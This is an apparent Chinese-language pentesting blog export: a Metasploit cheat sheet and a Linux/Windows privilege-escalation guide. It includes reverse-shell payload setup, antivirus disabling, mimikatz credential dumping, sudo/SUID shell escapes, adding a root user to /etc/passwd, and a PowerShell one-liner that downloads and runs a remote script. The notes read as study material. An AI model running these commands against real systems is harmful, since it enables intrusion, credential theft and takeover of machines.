<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MSF用法</title>
    <link href="/2023/04/28/MSF/"/>
    <url>/2023/04/28/MSF/</url>
    
    <content type="html"><![CDATA[<h2 id="辅助模块-auxiliary"><a href="#辅助模块-auxiliary" class="headerlink" title="辅助模块_auxiliary"></a>辅助模块_auxiliary</h2><blockquote><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测、Dos攻击等功能</p></blockquote><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><blockquote><p>use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;</p></blockquote><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><blockquote><p>use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;</p></blockquote><h4 id="探测服务详细信息"><a href="#探测服务详细信息" class="headerlink" title="探测服务详细信息"></a>探测服务详细信息</h4><blockquote><p>sudo nmap A -p- -sS sC -T4 -Pn 192.168.1.1</p></blockquote><h4 id="服务查点"><a href="#服务查点" class="headerlink" title="服务查点"></a>服务查点</h4><blockquote><p>search [service_name]_version</p></blockquote><h4 id="口令猜测"><a href="#口令猜测" class="headerlink" title="口令猜测"></a>口令猜测</h4><blockquote><p>&#x2F;usr&#x2F;share&#x2F;wordlists</p></blockquote><h4 id="敏感目录扫描"><a href="#敏感目录扫描" class="headerlink" title="敏感目录扫描"></a>敏感目录扫描</h4><blockquote><p>use auxiliary&#x2F;scanner&#x2F;http&#x2F;dir_scanner</p></blockquote><h4 id="扫描内网中存在特定目录的主机"><a href="#扫描内网中存在特定目录的主机" class="headerlink" title="扫描内网中存在特定目录的主机"></a>扫描内网中存在特定目录的主机</h4><blockquote><p>use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010<br>use auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep</p></blockquote><h2 id="攻击模块-exploits"><a href="#攻击模块-exploits" class="headerlink" title="攻击模块_exploits"></a>攻击模块_exploits</h2><h4 id="主动渗透攻击"><a href="#主动渗透攻击" class="headerlink" title="主动渗透攻击"></a>主动渗透攻击</h4><blockquote><p>发送网络数据，触发安全漏洞</p></blockquote><h6 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h6><blockquote><p>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternablue</p></blockquote><h6 id="Drupal-CVE-2018-7600"><a href="#Drupal-CVE-2018-7600" class="headerlink" title="Drupal CVE-2018-7600"></a>Drupal CVE-2018-7600</h6><blockquote><p>search Drupal</p></blockquote><h4 id="被动渗透攻击"><a href="#被动渗透攻击" class="headerlink" title="被动渗透攻击"></a>被动渗透攻击</h4><blockquote><p>浏览器软件漏洞攻击和文件格式漏洞攻击，引诱目标用户打开触发</p></blockquote><h6 id="Office-远程代码执行漏洞-CVE-2017-11882"><a href="#Office-远程代码执行漏洞-CVE-2017-11882" class="headerlink" title="Office 远程代码执行漏洞 CVE-2017-11882"></a>Office 远程代码执行漏洞 CVE-2017-11882</h6><blockquote><p>git clone <a href="http://github.com/starnightcyber/CVE-2017-11882.git">http://github.com/starnightcyber/CVE-2017-11882.git</a><br>python Command_CVE-2017-11882.py -c “cmd.exe &#x2F;c calc.exe” -o test.doc #-c 嵌入命令</p></blockquote><h2 id="攻击载荷-payload"><a href="#攻击载荷-payload" class="headerlink" title="攻击载荷_payload"></a>攻击载荷_payload</h2><blockquote><p>目标系统被渗透攻击之后需要执行的代码，反弹式shell、bind shell等<br>show payloads #查询当前漏洞可用的所有Payload<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp#设置攻击载荷<br>show options</p></blockquote><h2 id="空指令模块-nops"><a href="#空指令模块-nops" class="headerlink" title="空指令模块_nops"></a>空指令模块_nops</h2><blockquote><p>对一些程序运行状态不造成任何实质影响的空操作或者无关操作指令</p></blockquote><h2 id="编码器模块-encoders"><a href="#编码器模块-encoders" class="headerlink" title="编码器模块_encoders"></a>编码器模块_encoders</h2><blockquote><p>确保攻击载荷中不会出现渗透攻击过程中应加以避免出现的’坏字符’<br>对攻击载荷进行’免杀’处理</p></blockquote><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><blockquote><p>在受控系统中进行各种各样的后渗透攻击动作，如获取敏感信息、进一步拓展、实施跳板攻击等</p></blockquote><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">==========================================<br>核心命令：<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>?                             帮助菜单<br>background                    把当前会话挂到后台运行<br>bg                            background命令的别名<br>bgkill                        杀死后台meterpreter 脚本<br>bglist                        列出正在运行的后台脚本<br>bgrun                         执行一个meterpreter脚本作为后台线程<br>channel                       显示信息或控制活动频道<br>close                         关闭一个频道<br>detach                        分离Meterpreter会话（用于 http/https）<br>disable<span class="hljs-emphasis">_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="hljs-emphasis">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="hljs-emphasis">exit                          终止 Meterpreter 会话</span><br><span class="hljs-emphasis">get_timeouts                  获取当前会话超时值</span><br><span class="hljs-emphasis">guid                          获取会话 GUID</span><br><span class="hljs-emphasis">help                          帮助菜单</span><br><span class="hljs-emphasis">info                          显示有关 Post 模块的信息</span><br><span class="hljs-emphasis">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="hljs-emphasis">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="hljs-emphasis">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="hljs-emphasis">migrate                       将服务器迁移到另一个进程</span><br><span class="hljs-emphasis">pivot                         管理枢轴侦听器</span><br><span class="hljs-emphasis">pry                           在当前会话上打开 Pry 调试器</span><br><span class="hljs-emphasis">quit                          终止 Meterpreter 会话</span><br><span class="hljs-emphasis">read                          从通道读取数据</span><br><span class="hljs-emphasis">resource                      运行存储在文件中的命令</span><br><span class="hljs-emphasis">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="hljs-emphasis">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="hljs-emphasis">sessions                      快速切换到另一个会话</span><br><span class="hljs-emphasis">set_timeouts                  设置当前会话超时值</span><br><span class="hljs-emphasis">sleep                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="hljs-emphasis">ssl_</span>verify                    修改 SSL 证书验证设置<br>transport                     管理运输机制<br>use                           不推荐使用的load命令别名<br>uuid                          获取当前会话的 UUID<br>write                         将数据写入通道<br><br>==========================================<br>Stdapi：文件系统命令<br>==========================================<br><br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>cat                           将文件内容读到屏幕上<br>cd                            切换目录<br>checksum                      检索文件的校验和<br>cp                            将源复制到目标<br>del                           删除指定文件<br>dir                           列出文件（ls 的别名）<br>download                      下载文件或目录<br>edit                          编辑文件<br>getlwd                        打印本地工作目录<br>getwd                         打印工作目录<br>lcd                           更改本地工作目录<br>lls                           列出本地文件<br>lpwd                          打印本地工作目录<br>ls                            列出文件<br>mkdir                         制作目录<br>mv                            将源移动到目标<br>pwd                           打印工作目录<br>rm                            删除指定文件<br>rmdir                         删除目录<br>search                        搜索文件<br>show_mount                    列出所有挂载点/逻辑驱动器<br>upload                        上传文件或目录<br><br>==========================================<br>Stdapi：网络命令<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>arp                           显示主机 ARP 缓存<br>getproxy                      显示当前代理配置<br>ifconfig                      显示界面<br>ipconfig                      显示接口<br>netstat                       显示网络连接<br>portfwd                       将本地端口转发到远程服务<br>resolve                       解析目标上的一组主机名<br>route                         查看和修改路由表<br><br>==========================================<br>Stdapi：系统命令<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>clearev                       清除事件日志<br>drop<span class="hljs-emphasis">_token                    放弃任何活动的模拟令牌。</span><br><span class="hljs-emphasis">execute                       执行命令</span><br><span class="hljs-emphasis">getenv                        获取一个或多个环境变量值</span><br><span class="hljs-emphasis">getpid                        获取当前进程标识符</span><br><span class="hljs-emphasis">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="hljs-emphasis">getid                         获取服务器运行的用户的 SID</span><br><span class="hljs-emphasis">getuid                        获取服务器运行的用户</span><br><span class="hljs-emphasis">kill                          终止进程</span><br><span class="hljs-emphasis">localtime                     显示目标系统本地日期和时间</span><br><span class="hljs-emphasis">pgrep                         按名称过滤进程</span><br><span class="hljs-emphasis">pkill                         按名称终止进程</span><br><span class="hljs-emphasis">ps                            列出正在运行的进程</span><br><span class="hljs-emphasis">reboot                        重启远程计算机</span><br><span class="hljs-emphasis">reg                           修改远程注册表并与之交互</span><br><span class="hljs-emphasis">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="hljs-emphasis">shell                         放入系统命令 shell</span><br><span class="hljs-emphasis">shutdown                      关闭远程计算机</span><br><span class="hljs-emphasis">steal_</span>token                   尝试从目标进程窃取模拟令牌<br>suspend                       暂停或恢复进程列表<br>sysinfo                       获取有关远程系统的信息，例如 OS<br><br>==========================================<br>Stdapi：用户界面命令<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>enumdesktops                  列出所有可访问的桌面和窗口站<br>getdesktop                    获取当前的meterpreter桌面<br>idletime                      返回远程用户空闲的秒数<br>keyboard<span class="hljs-emphasis">_send                 发送击键</span><br><span class="hljs-emphasis">keyevent                      发送按键事件</span><br><span class="hljs-emphasis">keyscan_dump                  转储击键缓冲区</span><br><span class="hljs-emphasis">keyscan_start                 开始捕获击键</span><br><span class="hljs-emphasis">keyscan_</span>stop                  停止捕获击键<br>mouse                         发送鼠标事件<br>screenshare                   实时观看远程用户桌面<br>screenshot                    抓取交互式桌面的截图<br>setdesktop                    更改meterpreters当前桌面<br>uictl                         控制一些用户界面组件<br><br>==========================================<br>Stdapi：网络摄像头命令：<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>record<span class="hljs-emphasis">_mic                    从默认麦克风录制音频 X 秒</span><br><span class="hljs-emphasis">webcam_chat                   开始视频聊天</span><br><span class="hljs-emphasis">webcam_list                   列出网络摄像头</span><br><span class="hljs-emphasis">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="hljs-emphasis">webcam_</span>stream                 从指定的网络摄像头播放视频流<br><br>==========================================<br>Stdapi：音频输出命令：<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>play                          在目标系统上播放波形音频文件 (.wav)<br><br>==========================================<br>Priv：权限提升命令：<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>getsystem                     尝试将您的权限提升到本地系统的权限。<br><br>==========================================<br>Priv：密码数据库命令：<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>hashdump                      转储 SAM 数据库的内容<br><br>==========================================<br>Priv：Timestomp 命令：<br>==========================================<br>命令                           说明<br><span class="hljs-bullet">-------                       </span>------------<br>timestomp                     操作文件 MACE 属性<br></code></pre></td></tr></table></figure><h4 id="后渗透模块-posts"><a href="#后渗透模块-posts" class="headerlink" title="后渗透模块_posts"></a>后渗透模块_posts</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/migrate                <span class="hljs-comment">#自动进程迁移</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/checkvm                <span class="hljs-comment">#查看目标主机是否运行在虚拟机上</span><br>run post<span class="hljs-regexp">/windows/m</span>anage/killav                <span class="hljs-comment">#关闭杀毒软件</span><br>run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp            <span class="hljs-comment">#开启远程桌面服务</span><br>run post<span class="hljs-regexp">/windows/m</span>anage/autoroute              <span class="hljs-comment">#查看路由信息</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/enum_logged_on_users    <span class="hljs-comment">#列举当前登录的用户</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/enum_applications       <span class="hljs-comment">#列举应用程序</span><br>run post<span class="hljs-regexp">/windows/g</span>ather<span class="hljs-regexp">/credentials/</span>windows_autologin <span class="hljs-comment">#抓取自动登录的用户名和密码</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/smart_hashdump               <span class="hljs-comment">#dump出所有用户的hash</span><br></code></pre></td></tr></table></figure><blockquote><p>run post&#x2F;windows&#x2F;gather&#x2F;checkvm#查看主机是否运行在虚拟机上<br>run killav#关闭杀毒软件<br>run scraper#获取目标主机的详细信息<br>download file#下载文件<br>upload file#上传文件<br>getuid#获取当前用户的信息<br>getsystem#自动提权为系统权限<br>run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin#抓取自动登录的用户名和密码<br>run hashdump#导出密码哈希，导出本地用户账号，需要系统权限<br>run windows&#x2F;gather&#x2F;smart_hashdump#如果当前用户是域管理员，则导出域内所有用户的hash</p></blockquote><h6 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h6><blockquote><p>1.上传mimikatz程序，执行mimikatz必须System权限<br>1.1 getuid 查看当前用户<br>1.2 sysinfo 查看系统信息<br>1.3 upload file 上传对应系统位数的mimikatz程序<br>1.4 execute -i -f mimikatz.exe 进入mimikatz的交互界面<br>1.5 privilege::debug<br> sekurlsa::logonpasswords#抓取密码</p></blockquote><h6 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h6><blockquote><p>ps#查看进程<br>migrate PID#将进程迁移到其他程序中<br>load kiwi#加载kiwi模块<br>help kiwi#查看kiw模块的使用</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs 1c">creds_all：             <span class="hljs-meta">#列举所有凭据</span><br>creds_kerberos：        <span class="hljs-meta">#列举所有kerberos凭据</span><br>creds_msv：             <span class="hljs-meta">#列举所有msv凭据</span><br>creds_ssp：             <span class="hljs-meta">#列举所有ssp凭据</span><br>creds_tspkg：           <span class="hljs-meta">#列举所有tspkg凭据</span><br>creds_wdigest：         <span class="hljs-meta">#列举所有wdigest凭据</span><br>dcsync：                <span class="hljs-meta">#通过DCSync检索用户帐户信息</span><br>dcsync_ntlm：           <span class="hljs-meta">#通过DCSync检索用户帐户NTLM散列、SID和RID</span><br>golden_ticket_create：  <span class="hljs-meta">#创建黄金票据</span><br>kerberos_ticket_list：  <span class="hljs-meta">#列举kerberos票据</span><br>kerberos_ticket_purge： <span class="hljs-meta">#清除kerberos票据</span><br>kerberos_ticket_use：   <span class="hljs-meta">#使用kerberos票据</span><br>kiwi_cmd：              <span class="hljs-meta">#执行mimikatz的命令，后面接mimikatz.exe的命令</span><br>lsa_dump_sam：          <span class="hljs-meta">#dump出lsa的SAM</span><br>lsa_dump_secrets：      <span class="hljs-meta">#dump出lsa的密文</span><br>password_change：       <span class="hljs-meta">#修改密码</span><br>wifi_list：             <span class="hljs-meta">#列出当前用户的wifi配置文件</span><br>wifi_list_shared：      <span class="hljs-meta">#列出共享wifi配置文件/编码</span><br></code></pre></td></tr></table></figure><h2 id="免杀模块-evasion"><a href="#免杀模块-evasion" class="headerlink" title="免杀模块_evasion"></a>免杀模块_evasion</h2>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权</title>
    <link href="/2023/04/23/%E6%8F%90%E6%9D%83/"/>
    <url>/2023/04/23/%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h3><h5 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h5><blockquote><p>1.uname -a 查看内核版本<br>2.searchsploit 内核版本<br>3.上传提权文件<br>4.cat .c文件，查看编译命令<br>5.gcc -pthread 40839.c -o 40839 -lcrypt<br>6.执行脚本</p></blockquote><h5 id="使用工具进行漏洞检测-linux-exploit-suggester、linux-exploit-suggester-2"><a href="#使用工具进行漏洞检测-linux-exploit-suggester、linux-exploit-suggester-2" class="headerlink" title="使用工具进行漏洞检测[linux-exploit-suggester、linux-exploit-suggester-2]"></a>使用工具进行漏洞检测[linux-exploit-suggester、linux-exploit-suggester-2]</h5><blockquote><p>上传自动搜索提权漏洞的脚本: <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a><br><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p></blockquote><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><blockquote><p>SUID可以让调用者以文件拥有者的身份运行该文件,即运行root用户所拥有的的SUID文件</p></blockquote><h5 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h5><blockquote><ol><li>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null #查找系统运行的所有的SUID可执行文件</li><li>find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;</li></ol></blockquote><h5 id="vim提权"><a href="#vim提权" class="headerlink" title="vim提权"></a>vim提权</h5><blockquote><p>1.vim.tiny &#x2F;etc&#x2F;shadow<br>2.:set shell&#x3D;&#x2F;bin&#x2F;sh<br>3.:shell</p></blockquote><h5 id="bash提权"><a href="#bash提权" class="headerlink" title="bash提权"></a>bash提权</h5><blockquote><p>1.bash -p</p></blockquote><h5 id="less、more提权"><a href="#less、more提权" class="headerlink" title="less、more提权"></a>less、more提权</h5><blockquote><p>1.less &#x2F;etc&#x2F;passwd<br>2.!&#x2F;bin&#x2F;sh</p></blockquote><h5 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h5><blockquote><p>1.ls -l &#x2F;etc&#x2F;cron*<br>2.cat &#x2F;etc&#x2F;crontab<br>3.权限配置不当导致权限的提升<br>4.查看是否有777权限的文件在任务计划中<br>5.修改文件内容<br>6.等待计划任务的执行</p></blockquote><h3 id="Sudo滥用提权"><a href="#Sudo滥用提权" class="headerlink" title="Sudo滥用提权"></a>Sudo滥用提权</h3><blockquote><p>sudo -l 查看当前用户允许使用的命令</p></blockquote><h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><blockquote><p>sudo awk ‘BEGIN{system(“&#x2F;bin&#x2F;bash”)}’</p></blockquote><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote><p>sudo find &#x2F;home -exec &#x2F;bin&#x2F;bash ;</p></blockquote><h5 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h5><blockquote><p>sudo cat &#x2F;etc&#x2F;shadow</p></blockquote><h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><blockquote><p>touch 1.txt<br>sudo zip 1.zip 1.txt -T –unzip-command&#x3D;”sh -c &#x2F;bin&#x2F;bash”</p></blockquote><h5 id="git"><a href="#git" class="headerlink" title="git"></a>git</h5><blockquote><p>sudo git help add<br>!&#x2F;bin&#x2F;bash</p></blockquote><h5 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h5><blockquote><p>sudo ed<br>!&#x2F;bin&#x2F;sh</p></blockquote><h3 id="x2F-etc-x2F-passwd文件配置错误提权"><a href="#x2F-etc-x2F-passwd文件配置错误提权" class="headerlink" title="&#x2F;etc&#x2F;passwd文件配置错误提权"></a>&#x2F;etc&#x2F;passwd文件配置错误提权</h3><blockquote><p>查看当前用户是否有读写权限<br>perl -le ‘print crypt(“123456”,”addedsalt”)’#生成带有盐值的密码<br>echo “test:adrla7IBSfTZQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt;&#x2F;etc&#x2F;passwd #创建一个用户test且密码为123456</p></blockquote><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h3><blockquote><p>利用系统本身存在的一些系统内核溢出漏洞没有打补丁，或者对比systeminfo信息中的补丁信息来查找确实的补丁号，通过补丁号对照对应的系统版本查找对应可以提升权限的exp</p></blockquote><h4 id="补丁查找方法"><a href="#补丁查找方法" class="headerlink" title="补丁查找方法"></a>补丁查找方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">手工查找</span><br>systeminfo<br>Wmic qfe get Caption,Description,HotFixID,InstalledOn<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">MSF后渗透扫描</span><br>post/windows/gather/enum_patches<br>post/multi/recon/local_exploit_suggester<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">windows exploit suggester</span><br>https://github.com/AonCyberLabs/Windows-Exploit-Suggester<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">powershell中的sherlock脚本</span><br>Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块<br>Find-AllVulns<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法</span><br>usemodule privesc/powerup/allchecks<br>execute<br></code></pre></td></tr></table></figure><h4 id="版本对应的exp"><a href="#版本对应的exp" class="headerlink" title="版本对应的exp"></a>版本对应的exp</h4><blockquote><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br><a href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation">https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation</a><br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p></blockquote><h3 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a>系统配置错误提权</h3><h4 id="权限配置错误"><a href="#权限配置错误" class="headerlink" title="权限配置错误"></a>权限配置错误</h4><blockquote><p>Windows系统服务文件在操作系统启动时加载和运行，并在后台调用可执行文件<br>系统服务权限配置错误利用有如下两种方式：服务未启动：攻击者可以使用任意服务替换原来的服务，然后重启服务;服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用dll劫持技术并尝试重启服务来提权(需要administrtor权限)</p></blockquote><h5 id="查找错误配置"><a href="#查找错误配置" class="headerlink" title="查找错误配置"></a>查找错误配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs SHELL"><span class="hljs-meta prompt_">#</span><span class="language-bash">powerup提供了一些本地提权的方法，可以通过很多实用的脚本来寻找目标机器的windows服务漏洞</span><br>https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp<br>可直接通过powershell远程加载<br>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">msf 对应的模块为exploit/windows/local/service_permissions  但前提是获得一个会话</span><br>run exploit/windows/local/service_permissions #自动化提权，回来的的权限就是system<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">当工具无法使用时，也可以手工查找，使用Windows内建工具icacls查看服务启动路径中写权限</span><br>例如：icacls “C:\Program Files”<br>icacls “C:\Program Files\Common Files”<br><span class="hljs-meta prompt_"></span><br><span 